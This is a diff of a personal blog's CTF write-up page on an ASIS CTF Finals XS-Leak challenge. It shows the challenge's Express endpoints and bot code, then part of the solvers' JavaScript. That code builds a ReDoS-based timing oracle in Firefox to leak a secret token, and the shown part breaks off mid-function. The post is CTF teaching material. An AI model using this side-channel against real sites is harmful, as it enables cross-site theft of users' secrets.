@@ -16,7 +16,9 @@
   <link rel="stylesheet" href="/css/font.css"/>
   <link rel="stylesheet" href="/css/smigle.css"/>
   
-  <link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
+ <link rel="stylesheet" href="/css/syntax.css">
+
+    <link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
   <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
   <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
   <link rel="manifest" href="/site.webmanifest">
@@ -29,14 +31,14 @@
     <div id="root">
       <header>
   <div id="brand">
-    <a class="icon-link" href="https://salvatore-abello.github.io/">
+    <a class="icon-link" href="https://blog.babelo.xyz/">
       <img
         class="icon"
         src="/images/65adf8e914bdc50b5f5f2e8b91b68cb1.png"
       />
     </a>
     <div class="text">
-      <a href="https://salvatore-abello.github.io/"><h1>Salvatore Abello&#39;s Blog</h1></a>
+      <a href="https://blog.babelo.xyz/"><h1>Salvatore Abello&#39;s Blog</h1></a>
       <h3>Hacking &amp; other stuff</h3>
     </div>
   </div>
@@ -80,6 +82,16 @@
   <span> • 4 minute read</span>
   
   
+    <div>
+      <span>Tags:</span>
+      
+        <a href="/tags/cybersec">Cybersec</a>, 
+        <a href="/tags/writeup">Writeup</a>, 
+        <a href="/tags/redos">ReDoS</a>, 
+        <a href="/tags/client-side">client-side</a>, 
+        <a href="/tags/csp">csp</a>
+    </div>
+  
 </div>
 
       <div class="content"><p>This year, I played in the ASIS CTF Finals with <code>@TheRomanXpl0it</code>, and we secured 7th place at the end of the CTF. I decided to write this up because I&rsquo;ve never seen a similar challenge before. <code>@simonedimaria</code> and I worked on this challenge and solved it after about 8 hours.</p>
@@ -92,63 +104,63 @@
 </h2>
 <p>As the name suggests, this is an <a href="https://xsleaks.dev/">XS-Leak</a> challenge. We&rsquo;re given the source code and there are three endpoints.</p>
 <p><code>/save-flag</code></p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#75715e">// For the admin bot
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">app</span>.<span style="color:#a6e22e">get</span>(<span style="color:#e6db74">&#34;/save-flag&#34;</span>, (<span style="color:#a6e22e">req</span>, <span style="color:#a6e22e">res</span>) =&gt; {
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">token</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">crypto</span>.<span style="color:#a6e22e">randomBytes</span>(<span style="color:#ae81ff">6</span>).<span style="color:#a6e22e">toString</span>(<span style="color:#e6db74">&#34;hex&#34;</span>);
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">flag</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">req</span>.<span style="color:#a6e22e">cookies</span>.<span style="color:#a6e22e">FLAG</span>;
-</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">tokens</span>.<span style="color:#a6e22e">set</span>(<span style="color:#a6e22e">token</span>, <span style="color:#a6e22e">flag</span>);
-</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>({ <span style="color:#a6e22e">token</span>, <span style="color:#a6e22e">flag</span> });
-</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">setTimeout</span>(
-</span></span><span style="display:flex;"><span>        () =&gt; <span style="color:#a6e22e">tokens</span>.<span style="color:#66d9ef">delete</span>(<span style="color:#a6e22e">token</span>), <span style="color:#75715e">// expired
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        <span style="color:#ae81ff">120_000</span>
-</span></span><span style="display:flex;"><span>    );
-</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">clearCookie</span>(<span style="color:#e6db74">&#34;FLAG&#34;</span>).<span style="color:#a6e22e">cookie</span>(<span style="color:#e6db74">&#34;TOKEN&#34;</span>, <span style="color:#a6e22e">token</span>).<span style="color:#a6e22e">send</span>(<span style="color:#e6db74">&#34;Saved&#34;</span>);
-</span></span><span style="display:flex;"><span>});
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="c1">// For the admin bot
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nx">app</span><span class="p">.</span><span class="nx">get</span><span class="p">(</span><span class="s2">&#34;/save-flag&#34;</span><span class="p">,</span> <span class="p">(</span><span class="nx">req</span><span class="p">,</span> <span class="nx">res</span><span class="p">)</span> <span class="p">=&gt;</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="kr">const</span> <span class="nx">token</span> <span class="o">=</span> <span class="nx">crypto</span><span class="p">.</span><span class="nx">randomBytes</span><span class="p">(</span><span class="mi">6</span><span class="p">).</span><span class="nx">toString</span><span class="p">(</span><span class="s2">&#34;hex&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="kr">const</span> <span class="nx">flag</span> <span class="o">=</span> <span class="nx">req</span><span class="p">.</span><span class="nx">cookies</span><span class="p">.</span><span class="nx">FLAG</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">tokens</span><span class="p">.</span><span class="nx">set</span><span class="p">(</span><span class="nx">token</span><span class="p">,</span> <span class="nx">flag</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">({</span> <span class="nx">token</span><span class="p">,</span> <span class="nx">flag</span> <span class="p">});</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">setTimeout</span><span class="p">(</span>
+</span></span><span class="line"><span class="cl">        <span class="p">()</span> <span class="p">=&gt;</span> <span class="nx">tokens</span><span class="p">.</span><span class="k">delete</span><span class="p">(</span><span class="nx">token</span><span class="p">),</span> <span class="c1">// expired
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="mi">120_000</span>
+</span></span><span class="line"><span class="cl">    <span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">res</span><span class="p">.</span><span class="nx">clearCookie</span><span class="p">(</span><span class="s2">&#34;FLAG&#34;</span><span class="p">).</span><span class="nx">cookie</span><span class="p">(</span><span class="s2">&#34;TOKEN&#34;</span><span class="p">,</span> <span class="nx">token</span><span class="p">).</span><span class="nx">send</span><span class="p">(</span><span class="s2">&#34;Saved&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">});</span>
 </span></span></code></pre></div><p>Generates a random token and saves the flag. The token is deleted after 120 seconds.</p>
 <p><code>/get</code></p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#75715e">// If you steal a token, use it :)
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">app</span>.<span style="color:#a6e22e">get</span>(<span style="color:#e6db74">&#34;/get&#34;</span>, (<span style="color:#a6e22e">req</span>, <span style="color:#a6e22e">res</span>) =&gt; {
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">token</span> <span style="color:#f92672">=</span> String(<span style="color:#a6e22e">req</span>.<span style="color:#a6e22e">query</span>.<span style="color:#a6e22e">token</span>);
-</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">send</span>(<span style="color:#a6e22e">tokens</span>.<span style="color:#a6e22e">get</span>(<span style="color:#a6e22e">token</span>) <span style="color:#f92672">??</span> <span style="color:#e6db74">&#34;Not found&#34;</span>);
-</span></span><span style="display:flex;"><span>});
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="c1">// If you steal a token, use it :)
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nx">app</span><span class="p">.</span><span class="nx">get</span><span class="p">(</span><span class="s2">&#34;/get&#34;</span><span class="p">,</span> <span class="p">(</span><span class="nx">req</span><span class="p">,</span> <span class="nx">res</span><span class="p">)</span> <span class="p">=&gt;</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="kr">const</span> <span class="nx">token</span> <span class="o">=</span> <span class="nb">String</span><span class="p">(</span><span class="nx">req</span><span class="p">.</span><span class="nx">query</span><span class="p">.</span><span class="nx">token</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">res</span><span class="p">.</span><span class="nx">send</span><span class="p">(</span><span class="nx">tokens</span><span class="p">.</span><span class="nx">get</span><span class="p">(</span><span class="nx">token</span><span class="p">)</span> <span class="o">??</span> <span class="s2">&#34;Not found&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">});</span>
 </span></span></code></pre></div><p>Retrieves the flag given its token.</p>
 <p><code>/</code></p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#a6e22e">app</span>.<span style="color:#a6e22e">get</span>(<span style="color:#e6db74">&#34;/&#34;</span>, (<span style="color:#a6e22e">req</span>, <span style="color:#a6e22e">res</span>) =&gt; {
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">html</span> <span style="color:#f92672">=</span> String(<span style="color:#a6e22e">req</span>.<span style="color:#a6e22e">query</span>.<span style="color:#a6e22e">html</span> <span style="color:#f92672">??</span> <span style="color:#a6e22e">defaultHtml</span>);
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">html</span>.<span style="color:#a6e22e">length</span> <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">1024</span>) <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">send</span>(<span style="color:#e6db74">&#34;?&#34;</span>);
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#e6db74">/[^\x20-\x7e\r\n]/i</span>.<span style="color:#a6e22e">test</span>(<span style="color:#a6e22e">html</span>)) <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">send</span>(<span style="color:#e6db74">&#34;??&#34;</span>);
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#e6db74">/meta|link|src|data|href|svg|:|%|&amp;|\\|\/\//i</span>.<span style="color:#a6e22e">test</span>(<span style="color:#a6e22e">html</span>)) <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">send</span>(<span style="color:#e6db74">&#34;???&#34;</span>);
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">res</span>
-</span></span><span style="display:flex;"><span>        .<span style="color:#a6e22e">type</span>(<span style="color:#e6db74">&#34;html&#34;</span>)
-</span></span><span style="display:flex;"><span>        .<span style="color:#a6e22e">setHeader</span>(
-</span></span><span style="display:flex;"><span>            <span style="color:#e6db74">&#34;Content-Security-Policy&#34;</span>,
-</span></span><span style="display:flex;"><span>            <span style="color:#e6db74">&#34;default-src &#39;none&#39;; base-uri &#39;none&#39;; frame-ancestors &#39;none&#39;&#34;</span>
-</span></span><span style="display:flex;"><span>        )
-</span></span><span style="display:flex;"><span>        .<span style="color:#a6e22e">send</span>(<span style="color:#a6e22e">html</span>.<span style="color:#a6e22e">replace</span>(<span style="color:#e6db74">&#34;{{TOKEN}}&#34;</span>, <span style="color:#a6e22e">req</span>.<span style="color:#a6e22e">cookies</span>.<span style="color:#a6e22e">TOKEN</span>));
-</span></span><span style="display:flex;"><span>});
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="nx">app</span><span class="p">.</span><span class="nx">get</span><span class="p">(</span><span class="s2">&#34;/&#34;</span><span class="p">,</span> <span class="p">(</span><span class="nx">req</span><span class="p">,</span> <span class="nx">res</span><span class="p">)</span> <span class="p">=&gt;</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="kr">const</span> <span class="nx">html</span> <span class="o">=</span> <span class="nb">String</span><span class="p">(</span><span class="nx">req</span><span class="p">.</span><span class="nx">query</span><span class="p">.</span><span class="nx">html</span> <span class="o">??</span> <span class="nx">defaultHtml</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nx">html</span><span class="p">.</span><span class="nx">length</span> <span class="o">&gt;</span> <span class="mi">1024</span><span class="p">)</span> <span class="k">return</span> <span class="nx">res</span><span class="p">.</span><span class="nx">send</span><span class="p">(</span><span class="s2">&#34;?&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="sr">/[^\x20-\x7e\r\n]/i</span><span class="p">.</span><span class="nx">test</span><span class="p">(</span><span class="nx">html</span><span class="p">))</span> <span class="k">return</span> <span class="nx">res</span><span class="p">.</span><span class="nx">send</span><span class="p">(</span><span class="s2">&#34;??&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="sr">/meta|link|src|data|href|svg|:|%|&amp;|\\|\/\//i</span><span class="p">.</span><span class="nx">test</span><span class="p">(</span><span class="nx">html</span><span class="p">))</span> <span class="k">return</span> <span class="nx">res</span><span class="p">.</span><span class="nx">send</span><span class="p">(</span><span class="s2">&#34;???&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="nx">res</span>
+</span></span><span class="line"><span class="cl">        <span class="p">.</span><span class="nx">type</span><span class="p">(</span><span class="s2">&#34;html&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="p">.</span><span class="nx">setHeader</span><span class="p">(</span>
+</span></span><span class="line"><span class="cl">            <span class="s2">&#34;Content-Security-Policy&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">            <span class="s2">&#34;default-src &#39;none&#39;; base-uri &#39;none&#39;; frame-ancestors &#39;none&#39;&#34;</span>
+</span></span><span class="line"><span class="cl">        <span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="p">.</span><span class="nx">send</span><span class="p">(</span><span class="nx">html</span><span class="p">.</span><span class="nx">replace</span><span class="p">(</span><span class="s2">&#34;{{TOKEN}}&#34;</span><span class="p">,</span> <span class="nx">req</span><span class="p">.</span><span class="nx">cookies</span><span class="p">.</span><span class="nx">TOKEN</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl"><span class="p">});</span>
 </span></span></code></pre></div><p>This endpoint lets us render arbitrary HTML. If we put <code>{{TOKEN}}</code> inside our HTML, it will be replaced with the <code>TOKEN</code> cookie.</p>
 <p>Also, a new token is generated every time a URL is reported.</p>
 <p><code>bot.js</code></p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#66d9ef">await</span> <span style="color:#a6e22e">context</span>.<span style="color:#a6e22e">addCookies</span>([
-</span></span><span style="display:flex;"><span>    {
-</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">name</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;FLAG&#34;</span>,
-</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">value</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">FLAG</span>,
-</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">url</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">APP_URL</span>,
-</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">httpOnly</span><span style="color:#f92672">:</span> <span style="color:#66d9ef">true</span>,
-</span></span><span style="display:flex;"><span>    },
-</span></span><span style="display:flex;"><span>]);
-</span></span><span style="display:flex;"><span><span style="color:#75715e">// ...
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">page1</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">await</span> <span style="color:#a6e22e">context</span>.<span style="color:#a6e22e">newPage</span>();
-</span></span><span style="display:flex;"><span><span style="color:#66d9ef">await</span> <span style="color:#a6e22e">page1</span>.<span style="color:#66d9ef">goto</span>(<span style="color:#a6e22e">APP_URL</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;/save-flag&#34;</span>, { <span style="color:#a6e22e">timeout</span><span style="color:#f92672">:</span> <span style="color:#ae81ff">3_000</span> });
-</span></span><span style="display:flex;"><span><span style="color:#66d9ef">await</span> <span style="color:#a6e22e">sleep</span>(<span style="color:#ae81ff">2_000</span>);
-</span></span><span style="display:flex;"><span><span style="color:#66d9ef">await</span> <span style="color:#a6e22e">page1</span>.<span style="color:#a6e22e">close</span>();
-</span></span><span style="display:flex;"><span><span style="color:#75715e">// ...
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">page2</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">await</span> <span style="color:#a6e22e">context</span>.<span style="color:#a6e22e">newPage</span>();
-</span></span><span style="display:flex;"><span><span style="color:#66d9ef">await</span> <span style="color:#a6e22e">page2</span>.<span style="color:#66d9ef">goto</span>(<span style="color:#a6e22e">url</span>, { <span style="color:#a6e22e">timeout</span><span style="color:#f92672">:</span> <span style="color:#ae81ff">5_000</span> });
-</span></span><span style="display:flex;"><span><span style="color:#66d9ef">await</span> <span style="color:#a6e22e">sleep</span>(<span style="color:#ae81ff">60_000</span>);
-</span></span><span style="display:flex;"><span><span style="color:#66d9ef">await</span> <span style="color:#a6e22e">page2</span>.<span style="color:#a6e22e">close</span>();
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="kr">await</span> <span class="nx">context</span><span class="p">.</span><span class="nx">addCookies</span><span class="p">([</span>
+</span></span><span class="line"><span class="cl">    <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">name</span><span class="o">:</span> <span class="s2">&#34;FLAG&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">value</span><span class="o">:</span> <span class="nx">FLAG</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">url</span><span class="o">:</span> <span class="nx">APP_URL</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">httpOnly</span><span class="o">:</span> <span class="kc">true</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="p">},</span>
+</span></span><span class="line"><span class="cl"><span class="p">]);</span>
+</span></span><span class="line"><span class="cl"><span class="c1">// ...
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="kr">const</span> <span class="nx">page1</span> <span class="o">=</span> <span class="kr">await</span> <span class="nx">context</span><span class="p">.</span><span class="nx">newPage</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl"><span class="kr">await</span> <span class="nx">page1</span><span class="p">.</span><span class="kr">goto</span><span class="p">(</span><span class="nx">APP_URL</span> <span class="o">+</span> <span class="s2">&#34;/save-flag&#34;</span><span class="p">,</span> <span class="p">{</span> <span class="nx">timeout</span><span class="o">:</span> <span class="mi">3_000</span> <span class="p">});</span>
+</span></span><span class="line"><span class="cl"><span class="kr">await</span> <span class="nx">sleep</span><span class="p">(</span><span class="mi">2_000</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="kr">await</span> <span class="nx">page1</span><span class="p">.</span><span class="nx">close</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl"><span class="c1">// ...
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="kr">const</span> <span class="nx">page2</span> <span class="o">=</span> <span class="kr">await</span> <span class="nx">context</span><span class="p">.</span><span class="nx">newPage</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl"><span class="kr">await</span> <span class="nx">page2</span><span class="p">.</span><span class="kr">goto</span><span class="p">(</span><span class="nx">url</span><span class="p">,</span> <span class="p">{</span> <span class="nx">timeout</span><span class="o">:</span> <span class="mi">5_000</span> <span class="p">});</span>
+</span></span><span class="line"><span class="cl"><span class="kr">await</span> <span class="nx">sleep</span><span class="p">(</span><span class="mi">60_000</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="kr">await</span> <span class="nx">page2</span><span class="p">.</span><span class="nx">close</span><span class="p">();</span>
 </span></span></code></pre></div><p>The goal is:</p>
 <ul>
 <li>Steal the bot token within 60 seconds.</li>
@@ -317,52 +329,52 @@
 <p><img src="/images/image-fireleak.png" alt="alt text"></p>
 <p><strong>Note:</strong> If you don&rsquo;t know what a ReDoS is, check out <a href="https://blog.huli.tw/2023/06/12/en/redos-regular-expression-denial-of-service/">this article!</a>.</p>
 <p>We used the following regex and input:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#66d9ef">let</span> <span style="color:#a6e22e">regex</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;^&#34;</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">tobrute</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;(([a-f0-9]+.)[a-f0-9])+$&#34;</span>;
-</span></span><span style="display:flex;"><span><span style="color:#66d9ef">let</span> <span style="color:#a6e22e">input</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">`{{TOKEN}}</span><span style="color:#e6db74">${</span><span style="color:#e6db74">&#39;a&#39;</span>.<span style="color:#a6e22e">repeat</span>(<span style="color:#a6e22e">count</span>)<span style="color:#e6db74">}</span><span style="color:#e6db74">!`</span>;
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="kd">let</span> <span class="nx">regex</span> <span class="o">=</span> <span class="s2">&#34;^&#34;</span> <span class="o">+</span> <span class="nx">tobrute</span> <span class="o">+</span> <span class="s2">&#34;(([a-f0-9]+.)[a-f0-9])+$&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="kd">let</span> <span class="nx">input</span> <span class="o">=</span> <span class="sb">`{{TOKEN}}</span><span class="si">${</span><span class="s1">&#39;a&#39;</span><span class="p">.</span><span class="nx">repeat</span><span class="p">(</span><span class="nx">count</span><span class="p">)</span><span class="si">}</span><span class="sb">!`</span><span class="p">;</span>
 </span></span></code></pre></div><p>So if our token is <code>deadbeef</code>, our HTML element would be:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>&lt;<span style="color:#f92672">input</span> <span style="color:#a6e22e">value</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;deadbeefaaaaaaaaaaaaaaaaaaaaaaaaaaaaa!&#34;</span> <span style="color:#a6e22e">pattern</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;^d(([a-f0-9]+.)[a-f0-9])+$&#34;</span> /&gt;
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">input</span> <span class="na">value</span><span class="o">=</span><span class="s">&#34;deadbeefaaaaaaaaaaaaaaaaaaaaaaaaaaaaa!&#34;</span> <span class="na">pattern</span><span class="o">=</span><span class="s">&#34;^d(([a-f0-9]+.)[a-f0-9])+$&#34;</span> <span class="p">/&gt;</span>
 </span></span></code></pre></div><p>By doing so, if the first part of the pattern (<code>^d</code>) is matched, the regex will cause a ReDoS and we would know that the first character of the token is <code>d</code>.</p>
 <p><a href="https://blog.robertelder.org/regular-expression-visualizer/?the_regex=%5Ed((%5Ba-f0-9%5D%2B.)%5Ba-f0-9%5D)%2B%24&amp;the_subject=deadaaaaaa!">Here</a> you can see why it happens!</p>
 <p>Now we need a way to detect the ReDoS.</p>
 <p>We noticed that if we try to change the location of the window during the ReDoS (to <code>about:blank</code>), Firefox will go to that location only after finishing the validation process.</p>
 <p>So, we can detect how much time it takes to let that happen by continuously checking if we can retrieve the value of <code>window.opener</code>.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">sleep</span>(<span style="color:#a6e22e">time</span>) {
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">new</span> Promise((<span style="color:#a6e22e">resolve</span>) =&gt; <span style="color:#a6e22e">setTimeout</span>(<span style="color:#a6e22e">resolve</span>, <span style="color:#a6e22e">time</span>));
-</span></span><span style="display:flex;"><span>}
-</span></span><span style="display:flex;"><span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">popup</span>(<span style="color:#a6e22e">url</span>) {
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> window.<span style="color:#a6e22e">open</span>(<span style="color:#a6e22e">url</span>, <span style="color:#e6db74">&#34;palle&#34;</span>, <span style="color:#e6db74">&#34;width=200,height=100&#34;</span>);
-</span></span><span style="display:flex;"><span>}
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#66d9ef">async</span> <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">oracle</span>(<span style="color:#a6e22e">tobrute</span>) {
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">let</span> <span style="color:#a6e22e">final_pattern</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;^&#34;</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">tobrute</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;(([a-f0-9]+.)[a-f0-9])+$&#34;</span>;
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#e6db74">&#34;PATTERN&#34;</span>, <span style="color:#a6e22e">final_pattern</span>);
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">let</span> <span style="color:#a6e22e">count</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">30</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">tobrute</span>.<span style="color:#a6e22e">length</span> <span style="color:#f92672">-</span> <span style="color:#ae81ff">1</span>;
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">let</span> <span style="color:#a6e22e">tokstr</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;{{TOKEN}}&#34;</span>;
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">let</span> <span style="color:#a6e22e">html</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">`&lt;input value=&#34;{{TOKEN}}</span><span style="color:#e6db74">${</span><span style="color:#e6db74">&#39;a&#39;</span>.<span style="color:#a6e22e">repeat</span>(<span style="color:#a6e22e">count</span>)<span style="color:#e6db74">}</span><span style="color:#e6db74">!&#34; pattern=&#34;</span><span style="color:#e6db74">${</span><span style="color:#a6e22e">final_pattern</span><span style="color:#e6db74">}</span><span style="color:#e6db74">&#34; /&gt;`</span>;
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#a6e22e">html</span>);
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">w</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">popup</span>(<span style="color:#e6db74">&#34;http://web:3000/?html=&#34;</span> <span style="color:#f92672">+</span> encodeURIComponent(<span style="color:#a6e22e">html</span>));
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">await</span> <span style="color:#a6e22e">sleep</span>(<span style="color:#ae81ff">200</span>);
-</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">w</span>.<span style="color:#a6e22e">location</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;about:blank&#34;</span>;
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">start</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">performance</span>.<span style="color:#a6e22e">now</span>();
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">await</span> <span style="color:#66d9ef">new</span> Promise((<span style="color:#a6e22e">resolve</span>) =&gt; {
-</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">let</span> <span style="color:#a6e22e">interval</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">setInterval</span>(<span style="color:#66d9ef">async</span> () =&gt; {
-</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">try</span> {
-</span></span><span style="display:flex;"><span>                <span style="color:#a6e22e">w</span>.<span style="color:#a6e22e">origin</span>;
-</span></span><span style="display:flex;"><span>                <span style="color:#a6e22e">clearInterval</span>(<span style="color:#a6e22e">interval</span>);
-</span></span><span style="display:flex;"><span>                <span style="color:#a6e22e">resolve</span>();
